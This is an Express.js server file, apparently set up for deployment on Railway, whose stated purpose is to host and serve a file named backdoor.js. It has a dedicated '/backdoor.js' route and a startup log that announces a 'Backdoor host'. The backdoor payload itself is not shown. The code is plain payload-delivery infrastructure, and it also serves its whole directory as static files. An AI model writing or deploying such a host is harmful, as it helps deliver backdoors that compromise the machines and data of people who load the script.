const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000; // Railway uses PORT env

// Serve static files
app.use(express.static(__dirname));

// Root - serve index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Backdoor endpoint
app.get('/backdoor.js', (req, res) => {
    res.sendFile(path.join(__dirname, 'backdoor.js'));
});

// Railway health check
app.get('/health', (req, res) => {
    res.status(200).send('OK');
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Backdoor host running on port ${PORT}`);
    console.log(`📄 /backdoor.js`);
});
